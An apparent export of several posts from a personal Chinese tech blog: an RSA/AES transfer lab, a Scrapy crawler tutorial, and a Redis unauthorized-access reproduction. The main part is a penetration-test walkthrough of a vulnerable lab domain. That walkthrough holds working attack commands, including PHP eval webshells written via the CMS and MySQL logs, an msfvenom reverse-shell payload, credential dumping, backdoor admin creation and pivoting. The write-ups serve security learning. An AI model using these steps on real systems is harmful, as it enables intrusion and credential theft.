client.send(bytes(str(n),&quot;utf-8&quot;)) print(&quot;等待bob验证自身身份...&quot;) # alice送出自己的身份信息和签名值 client.send(bytes(name,&#x27;utf-8&#x27;)) # alice发送身份明文信息 client.recv(1024).decode() hash_name = md5(name) crpto_name = str(RSAEncode( hash_name, d, n)) # 发送对hash值加密后的值 crpto_name = bytes(crpto_name,&#x27;utf-8&#x27;) client.send(crpto_name) print(client.recv(1024).decode()) # 接收身份认证的结果 #接收bob身份hash值并验证 print(&quot;验证bob身份...&quot;) bob_name = client.recv(512).decode() # bob发送过来的身份明文信息 client.send(b&#x27;1&#x27;) hash_name = client.recv(512).decode() # bob使用自己的私钥加密身份明文信息hash值后的值 plain_text = RSADecode(int(hash_name),e,n_bob) # 使用bob的公钥解密上一步的值 if plain_text == md5(bob_name): # 验证是不是bob print(bob_name) print(&quot;验证通过!&quot;) client.send(bytes(&quot;您通过了验证!&quot;, &quot;utf-8&quot;)) else: exit(&quot;验证错误!&quot;) print(&quot;------------开始传输对称加密密钥-----------&quot;) key = 0x12345678 int_key = int(key) enc_key = RSA(int_key,e,n_bob) print(&quot;RAS加密后的密钥:&quot;,enc_key) print(&quot;开始传输......&quot;) client.sendall(bytes(str(enc_key), &quot;utf-8&quot;)) print(&quot;---&quot; * 5 + &quot;开始传输密文&quot; + &quot;---&quot; * 5) # 一共发送八条消息 for i in range(0,8): print(&quot;发送第&#123;0&#125;条消息&quot;.format(i+1)) plain = read_file(i) # 读取文件内容 print(&quot;待加密的内容:&quot;, plain) enc_plain = AES_enc(plain, key) # 使用AES算法加密内容 print(&quot;加密后的结果:&quot;, enc_plain) client.recv(512) length = str(len(str(enc_plain))) # 传输发送内容的长度 length = bytes(length, &quot;utf-8&quot;) # 方便其接收 client.send(length) print(&quot;传输密文...&quot;) client.sendall(bytes(str(enc_plain), &quot;utf-8&quot;)) # 发送密文 message = client.recv(512).decode() client.send(b&#x27;1&#x27;) crypt_message = client.recv(512).decode() hash_message = RSADecode(int(crypt_message),e,n_bob) if hash_message == md5(message): print(message) print(&quot;文件传输结束！&quot;) client.close() 程序运行结果程序运行截图 服务器端 生成的p: 212578631077022742980302422715125542611 生成的q: 316188159582830019844276947208676920009 Waiting connection... Alice使用的公钥n: 76623010774774676027114980830533718839055908618566240235027551452927884987983 验证alice身份... This is alice. 验证通过！ 等待alice验证自身身份... 您通过了验证! -----------开始接收对称加密密钥------------- 收到的对称加密密钥: 0x12345678 ---------------开始接收密文--------------- 接收第1条消息 收到的密文: 135682548930565198779372680096238675594 收到的消息: NUP-SCS 接收第2条消息 收到的密文: 204524647430676670718786346706390507203 收到的消息: helle,bob! 接收第3条消息 收到的密文: 246320535020402174803721345214000008151 收到的消息: I am alice! 接收第4条消息 收到的密文: 58157974753797302313029320017455836609 收到的消息: I am a cumter! 接收第5条消息 收到的密文: 226398669380783825649368460310305319452 收到的消息: zheshixiexiaox 接收第6条消息 收到的密文: 53302749101918911090246485689074999058 收到的消息: sadsadddddd 接收第7条消息 收到的密文: 176777421636819016900191058879173899767 收到的消息: asdasda 接收第8条消息 收到的密文: 3474752232209638365517789143309475776 收到的消息: welcome to nwpu! 文件传输结束！ Process finished with exit code 0 客户端 生成的p: 248283914849807386247828596061320396999 生成的q: 308610450343211666351389068102678761017 Welcome connect! 开分发RSA公钥n: bob使用的公钥n: 67214846126881216073162389743685441714708801777758418373886646066828368003499 等待bob验证自身身份... 您通过了验证! 验证bob身份... This is bob. 验证通过! ------------开始传输对称加密密钥----------- RAS加密后的密钥: 32731716332593832426148490730299678696611415440651747149365389018478993136648 开始传输...... ---------------开始传输密文--------------- 发送第1条消息 读取成功! 待加密的内容: NUP-SCS 加密后的结果: 135682548930565198779372680096238675594 传输密文... 发送第2条消息 读取成功! 待加密的内容: helle,bob! 加密后的结果: 204524647430676670718786346706390507203 传输密文... 发送第3条消息 读取成功! 待加密的内容: I am alice! 加密后的结果: 246320535020402174803721345214000008151 传输密文... 发送第4条消息 读取成功! 待加密的内容: I am a cumter! 加密后的结果: 58157974753797302313029320017455836609 传输密文... 发送第5条消息 读取成功! 待加密的内容: zheshixiexiaox 加密后的结果: 226398669380783825649368460310305319452 传输密文... 发送第6条消息 读取成功! 待加密的内容: sadsadddddd 加密后的结果: 53302749101918911090246485689074999058 传输密文... 发送第7条消息 读取成功! 待加密的内容: asdasda 加密后的结果: 176777421636819016900191058879173899767 传输密文... 发送第8条消息 读取成功! 待加密的内容: welcome to nwpu! 加密后的结果: 3474752232209638365517789143309475776 传输密文... Bob received the file successfully! 文件传输结束！ 五、安全分析 本系统最脆弱也是最危险的位置就是RSA密钥分发。在商业使用的密钥分发都存在一个可信的第三方（CA）,其作用是将用户的信息和用户使用的公钥用自己的私钥隐藏在证书中。当bob从可信第三方获取到alice的证书时，需要使用可信第三方的私钥（在CA的根证书）解密证书获取证书所有者信息和公钥（alice），alice使用同样的方法验证bob的信息，这样可以确保不会被中间人攻击。 认证过程的安全性 认证过程采用的是第二类签名算法，Alice和Bob的私钥只有自己知道，当Alice使用自己的私钥加密信息后，拥有Alice公钥的Bob能够解密其发送的内容，并使用验证公式就可以验证对面是否为Alice。 该过程可以理解为： 因为只有A才拥有私钥d ，而且由公钥e 和n在计算上不能求出保密的私钥。因此签名的操作只有A才能进行，任何其他人都不能伪造签名。所以，私钥d就相当于A的印章或指纹，而加密信息SA就是A对M（明文）的签名。因此A不能抵赖，任何其他人不能伪造。 这个过程具有不可否认认性和伪造攻击 对AES密钥加密使用的是RSA算法，该过程可以使用更大的数字来保证其安全性。比如使用生成1024位的p,q计算出n。由于我们知道公钥算法目前是安全的，所以这里加密后的密钥是安全的，即使被截获，攻击者也很难破解出明文信息。","tags":[{"name":"密码学","slug":"密码学","permalink":"https://sunzhengyu99.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"shentou","date":"2021-05-11T01:00:07.000Z","path":"2021/05/11/shentou/","text":"记一次渗透测试 环境搭建使用的靶机是红日安全提供的，地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ 搭建过程中有一点需要注意 Web服务主机win7有两块网卡，需要在设置中再添加一块网卡 网卡一连接到VMnet2中，作为内网环境 网卡二连接到VMnet1中，作为公网环境，并攻击机连到VMnet1中,确保其可以访问网站主页 剩下的两台域控主机直接连接到VMnet2中即可，可以与web服务器通信 修改window10物理机的VMnet1网卡 这样物理机和kali都可以访问到靶机网站 实验拓扑图: web服务器(win7): 公网IP:192.168.74.128 内网IP: 192.168.52.143 主机名:stu1 域成员主机(Windows Server 2003)：192.168.52.141 主机名：root-tvi862ubeh 域控(Windows Server 2008)：192.168.52.138 主机名：owa web服务器有两块网卡，其中192.168.74.128模拟的是公网环境，攻击者可以直接访问，192.168.52.143属于内网，攻击者无法直接访问 渗透过程网站探测首先访问网站主页: http://192.168.74.129/yxcms 先扫描一下目录 可以看存在很多可以访问的目录，并且这些目录都存在目录遍历漏洞，如/public,可以看到该目录下的很多内容，但是没有想要内容 网站漏洞利用getshell 经过探测网站的后台登录页面是http://192.168.74.129/yxcms/index.php?r=admin/index/login 经过爆破很容易试出密码为123456 成功登录后台 尝试搜索网站已发现的漏洞 这是一个网站常用的CMS，在网上搜索一下是否存在可以直接利用的漏洞 代码审计| yxcms app 1.4.6 漏洞集合 可以看到这个cms还是存在几个很好利用的漏洞的，尝试使用其中文件写入漏洞 访问http://192.168.74.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=default，这里可以写入php文件 写入一句话木马 写入成功后，访问http://192.168.74.129/yxcms/protected/apps/default/view/default/info.php可以看到已经成功写入一句话木马，之后就是用蚁剑连接 成功获取shell，并且是system权限，这是由于该网站管理员直接使用administrator登录域控主机，若是在真是环境中获取的是普通用户权限则还需要配合提权，获取system权限 使用phpMyAdmin Getshell扫描http://192.168.74.129/ 直接使用工具爆破，很容易得到，用户名和密码都为root 一开始的想法是利用写into outfile写木马getshell，但是由于网站的secure_file_priv的值为NULL，所以我们不能利用写into outfile写木马getshell 但是还有一种方法，就是向mysql日志中写入一句话木马，具体如下:mysql日志木马 执行下列命令 set global general_log&#x3D;on; #开启日志 set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;yxcms&#x2F;hack.php&#39;; #设置指定文件为网站日志存放文件 SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; #执行该语句，会将该命令写入日志文件 执行完命令，便可以在网站根目录下看到hack.php 浏览器访问http://192.168.74.129/yxcms/hack.php，一句话木马访问成功 后渗透攻击在拿到了Web服务器的权限后，我们就要尽可能多的搜集该服务器的信息，然后搭建隧道通往内网。 执行whoami ,ipconfig,net localgroup administrators命令我们知道当前的用户身份是 administrator ，在管理员组中，并且处在域 god 中。该主机有两张网卡，分别是：192.168.74.129，192.168.52.143 获取MSF shell使用msf生成木马 kali终端输入msfconsole，进入msf 选择带reverse和meterpreter(发送端接受端连接)的payloads进行反弹端口 use windows/x64/meterpreter_reverse_tcp 输入show options查看方法 新开一个终端输入以下命令，生成木马文件，并利用蚁剑上传到目标主机中 msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.74.130 lport=4444 -f exe -o 1.exe 再次输入msfconsole 进入应用，输入use exploit/multi/handler进入管理工具，获取shell权限，命令如下 use exploit/multi/handler set payload windows/x64/meterpreter_reverse_tcp set lhost kali&#x27;s ip run 即可获取shell 获取密码在meterpreter中运行run windows/gather/smart_hashdump,但是出现错误，提示需要system进程权限 使用migrate 388将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的 再使用run windows/gather/smart_hashdump 接下来是破解该密码 加载 kiwi模块 load kiwi creds_all 结果如下 meterpreter &gt; creds_all [+] Running as SYSTEM [*] Retrieving all credentials msv credentials =============== Username Domain LM NTLM SHA1 -------- ------ -- ---- ---- Administrator GOD edea194d76c77d87840ac10a764c7362 8a963371a63944419ec1adf687bb1be5 343f44056ed02360aead5618dd42e4614b5f70cf STU1$ GOD cde51539f42c2854d74e82db1173dd8c 50950d918317edf0ab95661a565c6ebf1151fe3b wdigest credentials =================== Username Domain Password -------- ------ -------- (null) (null) (null) Administrator GOD hongrisec@2019 STU1$ GOD 81 c2 84 7c a6 0f 51 4b 41 91 b3 1a 0d 7e 56 32 0e 37 c7 77 f7 54 09 f4 f2 8b 54 cc 6b 20 7e 9c 56 46 e5 ee d9 d2 84 aa 6a 82 82 58 b1 ae bf 47 db 9f 53 9e c9 a1 5f bb ae a2 c3 7f 2d 37 9d c1 9a 25 95 f6 49 b8 a2 f1 cb 0a ad f2 b2 27 c8 36 b2 eb a5 d9 3c 10 ca 0c 38 18 63 fb 0d 7f 67 ec 37 87 84 e9 cc f3 d8 56 72 bc 0c cf e8 20 a7 93 07 29 3d b5 48 b6 33 de e9 df 3a 73 04 94 a7 90 e6 d5 4f ce a8 88 9e a5 18 78 e4 43 e8 5b e5 47 dc 0a 34 be 79 6a fa fe 7f d5 c6 38 48 79 53 7b 3f 8f 9e 78 31 cf 35 7b 12 93 e7 3a f1 0c de 90 d9 e5 69 02 a9 ab c6 da f2 09 2f 8a 0a ed 19 44 11 c4 ba 93 12 73 04 69 3a 31 4e ff b8 a7 72 da 4b 6e ad db e9 52 7f 88 cf 0f 01 92 87 68 ba 5a d1 d3 ec 1f c3 b1 a5 3b 44 e5 7b 9d 2f a9 28 5b tspkg credentials ================= Username Domain Password -------- ------ -------- Administrator GOD hongrisec@2019 kerberos credentials ==================== Username Domain Password -------- ------ -------- (null) (null) (null) Administrator GOD.ORG hongrisec@2019 stu1$ GOD.ORG 81 c2 84 7c a6 0f 51 4b 41 91 b3 1a 0d 7e 56 32 0e 37 c7 77 f7 54 09 f4 f2 8b 54 cc 6b 20 7e 9c 56 46 e5 ee d9 d2 84 aa 6a 82 82 58 b1 ae bf 47 db 9f 53 9e c9 a1 5f bb ae a2 c3 7f 2d 37 9d c1 9a 25 95 f6 49 b8 a2 f1 cb 0a ad f2 b2 27 c8 36 b2 eb a5 d9 3c 10 ca 0c 38 18 63 fb 0d 7f 67 ec 37 87 84 e9 cc f3 d8 56 72 bc 0c cf e8 20 a7 93 07 29 3d b5 48 b6 33 de e9 df 3a 73 04 94 a7 90 e6 d5 4f ce a8 88 9e a5 18 78 e4 43 e8 5b e5 47 dc 0a 34 be 79 6a fa fe 7f d5 c6 38 48 79 53 7b 3f 8f 9e 78 31 cf 35 7b 12 93 e7 3a f1 0c de 90 d9 e5 69 02 a9 ab c6 da f2 09 2f 8a 0a ed 19 44 11 c4 ba 93 12 73 04 69 3a 31 4e ff b8 a7 72 da 4b 6e ad db e9 52 7f 88 cf 0f 01 92 87 68 ba 5a d1 d3 ec 1f c3 b1 a5 3b 44 e5 7b 9d 2f a9 28 5b 可以看到密码已经被破解处理 password：hongrisec@2019 远程桌面登录已经获得了administrator的账号和密码，现在我们既可以使用administrator账号登录，也可以新建账号登录。 直接使用administrator登录的话可能被管理员发现，所以使用第二种方法 net user hack password /add net localgroup administrators hack /add 查看主机是否开启3389端口 nmap -p 3389 -v 192.168.74.129 可以发现是关闭的。 使用meterpreter,打开该端口(运行之前好像需要重新弹出shell,直接运行没有成功) run post/windows/manage/enable_rdp 再次扫描就会发现3389端口已经打开 直接连接即可 添加路由、挂Socks4a代理 添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机 添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务 注：添加路由一定要在挂代理之前，因为代理需要用到路由功能 在获取shell的机器上添加路由 meterpreter &gt; run get_local_subnets meterpreter &gt; run autoroute -s 192.168.21.0/24 # 添加路由 meterpreter &gt; run autoroute -p # 显示路由 meterpreter &gt; route flush # 删除 使用run post/windows/gather/arp_scanner RHOSTS=192.168.21.0/24，查看存活的主机 然后建立socks4代理 meterpreter &gt; background msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a msf5 auxiliary(server/socks4a) &gt; set srvhost 127.0.0.1 msf5 auxiliary(server/socks4a) &gt; set srvport 1080 msf5 auxiliary(server/socks4a) &gt; run 设置完代理后攻击者主机就可以访问内网了 域信息收集net time /domain #查看时间服务器 net user /domain #查看域用户 net view /domain #查看有几个域 net group &quot;domain computers&quot; /domain #查看域内所有的主机名 net group &quot;domain admins&quot; /domain #查看域管理员 net group &quot;domain controllers&quot; /domain #查看域控 汇总 从域信息收集可以得到以下信息： 域：god.org 域内有三个用户：administrator、ligang、liukaifeng01 域内有三台主机：DEV1(不在此环境中)、ROOT-TVI862UBEH、STU1 域控：OWA(192.168.52.138) 域管理员：administrator 由此可见，我们现在获得的即是域管理员权限。此环境内还有一台ROOT-TVI862UBEH(192.168.52.141)和域控OWA(192.168.52.138)。 内网主机信息收集远程登录桌面后会看到一个Nmap应用，可以用这个探测内网主机 当然之前已经设置完代理了，也可以使用kali中的msf探测 内网存活主机探测在域环境渗透中可以省略，因为使用域命令可以直接查询域中有哪些主机。在非域环境中渗透，可以使用这一步。在这里顺带提一下这个用法。更多的关于使用MSF进行内网探测，传送门：后渗透阶段之基于MSF的内网主机探测 auxiliary/scanner/discovery/udp_sweep #基于udp协议发现内网存活主机 auxiliary/scanner/discovery/udp_probe #基于udp协议发现内网存活主机 auxiliary/scanner/netbios/nbname #基于netbios协议发现内网存活主机 内网存活主机端口扫描使用MSF自带模块进行端口探测 auxiliary/scanner/portscan/tcp #基于tcp进行端口扫描(默认扫描1-10000) 也可以用nmap扫描 内网存活主机服务探测auxiliary/scanner/ftp/ftp_version #发现内网ftp服务，基于默认21端口 auxiliary/scanner/ssh/ssh_version #发现内网ssh服务，基于默认22端口 auxiliary/scanner/telnet/telnet_version #发现内网telnet服务，基于默认23端口 auxiliary/scanner/dns/dns_amp #发现dns服务，基于默认53端口 auxiliary/scanner/http/http_version #发现内网http服务，基于默认80端口 auxiliary/scanner/http/title #探测内网http服务的标题 auxiliary/scanner/smb/smb_version #发现内网smb服务，基于默认的445端口 auxiliary/scanner/mssql/mssql_schemadump #发现内网SQLServer服务,基于默认的1433端口 auxiliary/scanner/oracle/oracle_hashdump #发现内网oracle服务,基于默认的1521端口 auxiliary/scanner/mysql/mysql_version #发现内网mysql服务，基于默认3306端口 auxiliary/scanner/rdp/rdp_scanner #发现内网RDP服务，基于默认3389端口 auxiliary/scanner/redis/redis_server #发现内网Redis服务，基于默认6379端口 auxiliary/scanner/db2/db2_version #探测内网的db2服务，基于默认的50000端口 auxiliary/scanner/netbios/nbname #探测内网主机的netbios名字","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://sunzhengyu99.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"spiderofwords","date":"2021-05-02T11:12:13.000Z","path":"2021/05/02/spiderofwords/","text":"scripy爬虫爬取单词(word.iciba.com) scripy爬虫爬取单词X首先创建一个有关数据库操作的pydbhelper.py import pymysql from scrapy.utils.project import get_project_settings // MYSQL_HOST等参数定义在setting.py中 // 也可以直接定义在这个文件中 class DBHelper(): def __init__(self): self.settings = get_project_settings() self.host = self.settings[&#x27;MYSQL_HOST&#x27;] self.port = self.settings[&#x27;MYSQL_PORT&#x27;] self.user = self.settings[&#x27;MYSQL_USER&#x27;] self.passwd = self.settings[&#x27;MYSQL_PASSWD&#x27;] self.db = self.settings[&#x27;MYSQL_DBNAME&#x27;] // 建立数据库连接 def connectMysql(self): conn = pymysql.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, charset=&#x27;utf8&#x27;) return conn // 创建数据库 def connectDatabase(self): conn = pymysql.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db, charset=&#x27;utf8&#x27;) return conn # 创建要使用到的数据库 def createDatabase(self): conn = self.connectMysql() sql = &quot;create database if not exists &quot; + self.db cur = conn.cursor() cur.execute(sql) # cur.close() conn.close() # 创建数据表 def createTable(self, sql): conn = self.connectDatabase() cur = conn.cursor() cur.execute(sql) cur.close() conn.close() # 向数据库中插入数据 def insert(self, sql, *params): # conn = self.connectDatabase() cur = conn.cursor(); cur.execute(sql, params) conn.commit() cur.close() conn.close() # 数据库更新操作 def update(self, sql, *params): conn = self.connectDatabase() cur = conn.cursor() cur.execute(sql, params) conn.commit() cur.close() conn.close() def delete(self, sql, *params): conn = self.connectDatabase() cur = conn.cursor() cur.execute(sql, params) conn.commit() cur.close() conn.close() class TestDBHelper(): def __init__(self): self.dbHelper = DBHelper() def testCreateDatebase(self): self.dbHelper.createDatabase() def testCreateTable(self): sql = &quot;create table wordtable(id int primary key auto_increment,word varchar(50),soundmark varchar(100),url varchar(200),translation varchar(100))&quot; self.dbHelper.createTable(sql) def testInsert(self): sql = &quot;insert into wordtable(word,soundmark,url,translation) values(%s,%s,%s,%s)&quot; params = (&quot;test&quot;, &quot;test&quot;, &quot;test&quot;, &quot;test&quot;) self.dbHelper.insert(sql, *params) def testUpdate(self): sql = &quot;update testtable set word=%s,soundmark=%s,url=%s,translation=%s where id=%s&quot; params = (&quot;update&quot;, &quot;update&quot;, &quot;update&quot;, &quot;update&quot;,&quot;1&quot;) self.dbHelper.update(sql, *params) def testDelete(self): sql = &quot;delete from wordtable where id=%s&quot; params = (&quot;1&quot;) self.dbHelper.delete(sql, *params) if __name__ == &quot;__main__&quot;: testDBHelper = TestDBHelper() # testDBHelper.testCreateDatebase() # testDBHelper.testCreateTable() # testDBHelper.testInsert() 在编写爬虫之前先运行一次该程序，就可以在数据库中看到新创建的数据库 爬虫编写setting.pyBOT_NAME = &#x27;words&#x27; SPIDER_MODULES = [&#x27;words.spiders&#x27;] NEWSPIDER_MODULE = &#x27;words.spiders&#x27; #Mysql数据库的配置信息 MYSQL_HOST = &#x27;127.0.0.1&#x27; MYSQL_DBNAME = &#x27;word&#x27; #数据库名字，请修改 MYSQL_USER = &#x27;root&#x27; #数据库账号，请修改 MYSQL_PASSWD = &#x27;root&#x27; #数据库密码，请修改 MYSQL_PORT = 3306 #数据库端口，在dbhelper中使用 # Crawl responsibly by identifying yourself (and your website) on the user-agent #USER_AGENT = &#x27;word (+http://www.yourdomain.com)&#x27; USER_AGENT = &#x27;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36&#x27; LOG_LEVEL = &quot;WARNING&quot; ROBOTSTXT_OBEY = True # Configure item pipelines # See https://docs.scrapy.org/en/latest/topics/item-pipeline.html ITEM_PIPELINES = &#123; # 两个管道的优先级相同 &#x27;words.pipelines.WebcrawlerScrapyPipeline&#x27;: 300, #保存到mysql数据库 &#x27;words.pipelines.JsonWithEncodingPipeline&#x27;: 300, #保存到json文件中 &#125; items.pyimport scrapy class WordsItem(scrapy.Item): # define the fields for your item here like: # name = scrapy.Field() word = scrapy.Field() soundmark = scrapy.Field() url = scrapy.Field() translation = scrapy.Field() web_word.py爬虫文件 import scrapy import re import os import urllib import sys import urllib.request from scrapy.selector import Selector from scrapy.http import HtmlResponse,Request from words.items import WordsItem class WebWordSpider(scrapy.Spider): name = &#x27;web_word&#x27; allowed_domains = [&#x27;word.iciba.com/&#x27;] # class 是四级必备单词，这里可以根据需要选择不同的单词表 first_url = &quot;http://word.iciba.com/?action=words&amp;class=11&amp;course=&#123;&#125;&quot; start_urls = [] # 生成爬取需要的url地址池 # 可以根据需要修改nums，控制爬取的单词数 nums = 11 # 爬取前10页的单词，一共200个单词 for page in range(1,nums): start_urls.append(first_url.format(page)) print(start_urls) def parse(self, response): se = Selector(response) # 先判断页面中是否存在单词 src = se.xpath(&quot;//div[@class=&#x27;word_main&#x27;]/ul/li&quot;) # 提取出url中的页数 page = re.findall(r&quot;course=\\d+&quot;, response.url)[0] print(&quot;===&quot; * 10 + &quot;正在爬取第&quot;+page[7:]+&quot;页&quot;+&quot;===&quot; * 10) if len(src) &gt; 0: # 将单词的信息提取出来，word是一个数组，存放的是页面中的所有单词 word = se.xpath(&quot;//li/div[@class=&#x27;word_main_list_w&#x27;]/span/@title&quot; ).extract() # 提取节点信息 soundmark = se.xpath(&quot;//li/div[@class=&#x27;word_main_list_y&#x27;]/strong/text()&quot; ).extract() url = se.xpath(&quot;//li/div[@class=&#x27;word_main_list_y&#x27;]/a/@id&quot; ).extract() translation = se.xpath(&quot;//li/div[@class=&#x27;word_main_list_s&#x27;]/span/@title&quot; ).extract() # 因为上一步提出的音标存在制表符，这里就用正则提取出正确的音标 for i in range(0,len(word)): sm = re.findall(r&quot;\\[.*?\\]&quot;,soundmark[i]) soundmark[i] = sm[0] for i in range(0,len(word)): file_name = u&quot;%s.mp3&quot; % word[i] # 用单词给mp3文件命名 path = os.path.join(&quot;D:\\Sunzh\\word\\cet4&quot;, file_name) # mp3保存的路径 urllib.request.urlretrieve(url[i], path) # 下载该mp3文件 item = WordsItem() item[&#x27;word&#x27;] = word[i] item[&#x27;soundmark&#x27;] = soundmark[i] item[&#x27;url&#x27;] = url[i] item[&#x27;translation&#x27;] = translation[i] # print(item) # 将item发给管道处理，在管道中写入数据库和josn文件 yield item 这里是使用xpath获取的节点元素，很简单。 可以在浏览器中下载一个插件XPath Helper，辅助写出xpath路径，它可以将所匹配的元素高亮显示，保证程序中的xpath正确性。 pipelines.pyimport pymysql import pymysql.cursors import codecs import json from logging import log from twisted.enterprise import adbapi class JsonWithEncodingPipeline(object): &#x27;&#x27;&#x27;保存到文件中对应的class 1、在settings.py文件中配置 2、在自己实现的爬虫类中yield item,会自动执行 &#x27;&#x27;&#x27; def __init__(self): self.file = codecs.open(&#x27;word.json&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) # 保存为json文件 def process_item(self, item, spider): line = json.dumps(dict(item)) + &quot;\\n&quot; # 转为json的 self.file.write(line) # 写入文件中 return item def spider_closed(self, spider): # 爬虫结束时关闭文件 self.file.close() class WebcrawlerScrapyPipeline(object): &#x27;&#x27;&#x27; 保存到数据库中对应的class 1、在settings.py文件中配置 2、在自己实现的爬虫类中yield item,会自动执行 &#x27;&#x27;&#x27; def __init__(self, dbpool): self.dbpool = dbpool # 定义一个数据库连接对象 &#x27;&#x27;&#x27; 这里注释中采用写死在代码中的方式连接线程池，可以从settings配置文件中读取，更加灵活 self.dbpool=adbapi.ConnectionPool(&#x27;MySQLdb&#x27;, host=&#x27;127.0.0.1&#x27;, db=&#x27;crawlpicturesdb&#x27;, user=&#x27;root&#x27;, passwd=&#x27;123456&#x27;, cursorclass=MySQLdb.cursors.DictCursor, charset=&#x27;utf8&#x27;, use_unicode=False) &#x27;&#x27;&#x27; @classmethod def from_settings(cls, settings): &#x27;&#x27;&#x27; 1、@classmethod声明一个类方法，而对于平常我们见到的则叫做实例方法。 2、类方法的第一个参数cls（class的缩写，指这个类本身），而实例方法的第一个参数是self，表示该类的一个实例 3、可以通过类来调用，就像C.f()，相当于java中的静态方法 &#x27;&#x27;&#x27; dbparams = dict( host=settings[&#x27;MYSQL_HOST&#x27;], # 读取settings中的配置 db=settings[&#x27;MYSQL_DBNAME&#x27;], user=settings[&#x27;MYSQL_USER&#x27;], passwd=settings[&#x27;MYSQL_PASSWD&#x27;], charset=&#x27;utf8&#x27;, # 编码要加上，否则可能出现中文乱码问题 cursorclass=pymysql.cursors.DictCursor, use_unicode=False, ) dbpool = adbapi.ConnectionPool(&#x27;pymysql&#x27;, **dbparams) # **表示将字典扩展为关键字参数,相当于host=xxx,db=yyy.... return cls(dbpool) # 相当于dbpool付给了这个类，self中可以得到 # pipeline默认调用 def process_item(self, item, spider): query = self.dbpool.runInteraction(self._conditional_insert, item) # 调用插入的方法 query.addErrback(self._handle_error, item, spider) # 调用异常处理方法 return item # 写入数据库中 def _conditional_insert(self, tx, item): # print (item[&#x27;word&#x27;]) sql = &quot;insert into wordtable(word,soundmark,url,translation) values(%s,%s,%s,%s)&quot; params = (item[&quot;word&quot;], item[&quot;soundmark&quot;], item[&quot;url&quot;], item[&quot;translation&quot;]) tx.execute(sql, params) # 错误处理方法 def _handle_error(self, failue, item, spider): print(&#x27;--------------database operation exception!!-----------------&#x27;) print(&#x27;-------------------------------------------------------------&#x27;) print(failue) pipelines中写了两个方法，分别是将单词的相关性信息写入到数据库，另一个是将单词信息保存到一个json文件中 运行结果运行截图 json文件截图 下载的音频 数据库内容 爬取壁纸的爬虫import scrapy import pymysql import re import os import urllib import sys import urllib.request from word.items import WordItem from scrapy.selector import Selector from scrapy.http import HtmlResponse,Request class SpiderPicSpider(scrapy.Spider): name = &#x27;spider_pic&#x27; allowed_domains = [&#x27;desk.zol.com.cn&#x27;] # 爬虫搜索的域名范围 first_url = &quot;http://desk.zol.com.cn/meinv/1920x1080/&#123;0&#125;.html&quot; start_urls = [first_url.format(1)] # 爬虫开始的url def parse(self, response): for i in range(1, 10): url = self.first_url.format(i) yield Request( url=url, callback=self.parse_one ) def parse_one(self, response): se = Selector(response) # 创建查询对象 if (re.match(&quot;https://desk.zol.com.cn/meinv/\\d+x\\d+/\\d+.html&quot;, response.url)): # 正则是判断改url是否正确 src = se.xpath(&quot;//ul[@class=&#x27;pic-list2 clearfix&#x27;]/li&quot;) # 使用xpath找到所有图片所在的节点 for i in range(1, len(src)): imgURLs = se.xpath(&quot;//ul[@class=&#x27;pic-list2 clearfix&#x27;]/li[%d]/a/img/@src&quot; % i).extract() # 提取节点信息 title = se.xpath(&quot;//ul[@class=&#x27;pic-list2 clearfix&#x27;]/li[%d]/a/img/@title&quot; % i).extract() if imgURLs: # 替换url中的尺寸信息 可以下载更大的图片 realURL = imgURLs[0].replace(&quot;t_s208x130c5&quot;, &quot;t_s2560x1600c5&quot;) file_name = u&quot;%s.jpg&quot; % title[0] path = os.path.join(&quot;D:\\Sunzh\\pic\\meinv&quot;, file_name) # 拼接图片的路径 type = sys.getfilesystemencoding() print(file_name.encode(type)) item = WordItem() item[&#x27;name&#x27;] = file_name item[&#x27;url&#x27;] = realURL # print(item[&#x27;name&#x27;],item[&#x27;url&#x27;]) yield item urllib.request.urlretrieve(realURL, path) # 接收文件路径和需要保存的路径，会自动去文件路径下载并保存到我们指定的本地路径","tags":[]},{"title":"redis","date":"2021-04-14T07:39:21.000Z","path":"2021/04/14/redis/","text":"redis未授权访问漏洞复现漏洞简介Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。 该漏洞的产生条件有以下两点： 1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。 漏洞危害：(1) 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；(2) 攻击者可通过执行lua代码，或通过数据备份功能往磁盘写入后门文件；(3) 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器; 环境搭建在kali中安装redis 3.2.0 创建redis安装目录 mkdir /usr/local/redis cd /usr/local/redis/ wget http://download.redis.io/releases/redis-3.2.0.tar.gz //获取redis压缩包 tar xzf redis-3.2.0.tar.gz cd /usr/local/redis/redis-3.2.0 make #编译安装 安装完成之后需要修改配置文件，配置允许可以远程访问。 vim redis.conf #修改默认配置文件 在bind 127.0.0.1前面加上#号进行注释，并将protected-mode设置为no。 